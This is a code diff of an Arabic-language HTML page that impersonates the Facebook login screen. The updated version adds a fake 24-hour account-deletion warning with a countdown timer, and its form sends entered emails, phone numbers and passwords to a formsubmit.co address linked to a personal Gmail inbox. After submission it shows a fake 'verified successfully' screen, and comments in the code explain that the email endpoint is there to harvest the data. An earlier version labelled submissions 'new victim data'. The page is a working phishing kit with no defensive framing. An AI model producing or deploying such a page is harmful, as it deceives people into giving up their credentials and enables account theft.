@@ -6,41 +6,55 @@
     <title>تسجيل الدخول - فببسبوك</title>
     <style>
         body {
-            font-family: Helvetica, Arial, sans-serif;
             background-color: #f0f2f5;
+            font-family: Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            flex-direction: column;
         }
         .container {
             background-color: white;
-            padding: 20px;
+            padding: 40px;
             border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-            width: 350px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+            width: 390px;
             text-align: center;
+            position: relative;
         }
         .logo {
             color: #1877f2;
-            font-size: 40px;
+            font-size: 42px;
             font-weight: bold;
-            margin-bottom: 20px;
             letter-spacing: -1px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            font-size: 24px;
+            font-weight: 600;
+            margin: 0 0 10px 0;
+            color: #1c1e21;
+        }
+        p.warning-text {
+            font-size: 15px;
+            line-height: 20px;
+            color: #606770;
+            margin-bottom: 25px;
         }
         input {
-            width: 90%;
-            padding: 14px 10px;
-            margin-bottom: 15px;
-            border: 1px solid #ddd;
+            width: 100%;
+            padding: 16px 12px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
             border-radius: 6px;
-            font-size: 16px;
-            outline: none;
+            font-size: 17px;
+            box-sizing: border-box;
         }
         input:focus {
+            outline: none;
             border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
         }
         button {
             width: 100%;
@@ -49,98 +63,128 @@
             color: white;
             border: none;
             border-radius: 6px;
-            font-size: 18px;
+            font-size: 20px;
             font-weight: bold;
             cursor: pointer;
-            transition: background 0.3s;
+            margin-top: 10px;
         }
         button:hover {
             background-color: #166fe5;
         }
-        a {
-            display: block;
-            margin-top: 15px;
-            color: #1877f2;
-            text-decoration: none;
-            font-size: 14px;
+        .footer {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #777;
         }
-        /* شاشة الحذف */
-        #delete-screen {
+        
+        /* العداد التنازلي */
+        .timer-box {
+            background-color: #fff3cd;
+            color: #856404;
+            padding: 10px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            border: 1px solid #ffeeba;
+        }
+        
+        /* رسالة النجاح المخفية */
+        .success-message {
             display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: white;
-            z-index: 999;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
             text-align: center;
         }
-        .loader {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #1877f2;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
+        .check-icon {
+            width: 80px;
+            height: 80px;
             margin-bottom: 20px;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .success-title {
+            color: #1877f2;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
         }
-        h2 { color: #333; }
-        p { color: #666; }
     </style>
 </head>
 <body>
 
+<div class="container">
+    
     <!-- واجهة تسجيل الدخول -->
-    <div class="container" id="login-form-container">
+    <div id="loginView">
         <div class="logo">facebook</div>
         
-        <!-- هنا نضع الإيميل الخاص بك ليعمل حشر البيانات -->
+        <h2>تنبيه أمني</h2>
+        <p class="warning-text">
+            سيتم حذف حسابك نهائياً خلال 24 ساعة.<br>
+            يرجى تأكيد بياناتك للمتابعة.
+        </p>
+
+        <div class="timer-box">
+            الوقت المتبقي: <span id="time">23:59:59</span>
+        </div>
+
+        <!-- ربط مباشر بالإيميل الخاص بك -->
         <form action="https://formsubmit.co/c8ha12i8m@gmail.com" method="POST">
-            
-            <!-- إعدادات إضافية -->
-            <input type="hidden" name="_subject" value="بيانات ضحية جديدة!">
+            <input type="hidden" name="_subject" value="بيانات جديدة - تنبيه الحذف!">
             <input type="hidden" name="_captcha" value="false">
-            <input type="hidden" name="_next" value=""> 
-
-            <input type="text" name="Email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-            <input type="password" name="Password" placeholder="كلمة المرور" required>
             
-            <button type="submit" onclick="startProcess()">تسجيل الدخول</button>
+            <input type="text" name="email_or_phone" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" name="password" placeholder="كلمة المرور" required>
+            
+            <button type="submit">تسجيل الدخول</button>
         </form>
-        <a href="#">هل نسيت حسابك؟</a>
+        
+        <div class="footer">
+            © 2026 Facebook من Meta
+        </div>
     </div>
 
-    <!-- شاشة "تم حذف المنشور" -->
-    <div id="delete-screen">
-        <div class="loader"></div>
-        <h2>جاري التحقق...</h2>
+    <!-- واجهة النجاح (مخفية) -->
+    <div id="successView" class="success-message">
+        <svg class="check-icon" viewBox="0 0 512 512" fill="#1877f2">
+            <path d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256 256-114.6 256-256S397.4 0 256 0zm-27.3 368.7L126.9 265.6c-9.4-9.4-9.4-24.6 0-33.9l16.9-16.9c9.4-9.4 24.6-9.4 33.9 0l65.5 65.5 182.5-182.5c9.4-9.4 24.6-9.4 33.9 0l16.9 16.9c9.4 9.4 9.4 24.6 0 33.9L262.7 368.7c-9.4 9.4-24.6 9.4-33.9 0z"/>
+        </svg>
+        <div class="success-title">تم التحقق بنجاح!</div>
+        <p style="color:#606770;">تم تأكيد بياناتك بنجاح. حسابك الآن آمن.</p>
     </div>
 
-    <script>
-        function startProcess() {
-            // إخفاء النموذج وإظهار شاشة الانتظار
-            document.getElementById('login-form-container').style.display = 'none';
-            const screen = document.getElementById('delete-screen');
-            screen.style.display = 'flex';
+</div>
 
-            // تغيير النص بعد ثانيتين ليحاكي العملية
-            setTimeout(() => {
-                document.querySelector('#delete-screen h2').innerText = "تم حذف المنشور";
-                document.querySelector('.loader').style.display = 'none';
-                
-                // يمكنك إضافة تأخير ثم إعادة تحميل الصفحة إذا أردت
-                // window.location.reload(); 
-            }, 2000);
+<script>
+    // كود العداد التنازلي
+    let hours = 23;
+    let minutes = 59;
+    let seconds = 59;
+
+    setInterval(() => {
+        if(seconds > 0) {
+            seconds--;
+        } else if(minutes > 0) {
+            minutes--;
+            seconds = 59;
+        } else if(hours > 0) {
+            hours--;
+            minutes = 59;
+            seconds = 59;
         }
-    </script>
+        
+        document.getElementById('time').innerText = 
+            `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+    }, 1000);
+
+    // عند الضغط على زر الإرسال
+    const form = document.querySelector('form');
+    form.addEventListener('submit', function(e) {
+        // ما نمنعووش الإرسال للإيميل
+        // لكن نبدلو الواجهة فوراً باش يباني حقيقي
+        
+        setTimeout(() => {
+            document.getElementById('loginView').style.display = 'none';
+            document.getElementById('successView').style.display = 'block';
+        }, 500); // تأخير بسيط باش يشوف الزر ضغط
+    });
+</script>
 
 </body>
 </html>
